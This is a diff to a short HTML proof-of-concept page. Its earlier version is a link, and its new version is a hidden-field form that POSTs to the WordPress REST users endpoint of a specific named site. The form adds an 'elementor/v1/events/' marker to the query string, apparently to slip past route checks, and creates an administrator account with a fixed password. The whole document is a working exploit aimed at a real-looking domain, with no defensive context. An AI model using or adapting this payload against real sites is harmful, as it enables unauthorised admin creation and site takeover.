@@ -1,9 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
-<head><meta charset="utf-8"><title>PoC</title></head>
+<html lang="en"><head><meta charset="utf-8"><title>PoC</title></head>
 <body>
-  <a href="https://mrgm.co.ke/wp-json/wp/v2/users?_method=POST&username=test&email=test%40example.test&password=Mike%4017894&roles%5B%5D=administrator&x=elementor/v1/events/">
-    Open document
-  </a>
-</body>
-</html>
+  <!-- Literal slashes in the marker. Nothing else needed. -->
+  <form action="https://mrgm.co.ke/wp-json/wp/v2/users?x=elementor/v1/events/" method="POST">
+    <input type="hidden" name="username" value="test">
+    <input type="hidden" name="email" value="test@example.test">
+    <input type="hidden" name="password" value="Mike@17894">
+    <input type="hidden" name="roles[]" value="administrator">
+    <button type="submit">Create test admin</button>
+  </form>
+</body></html>
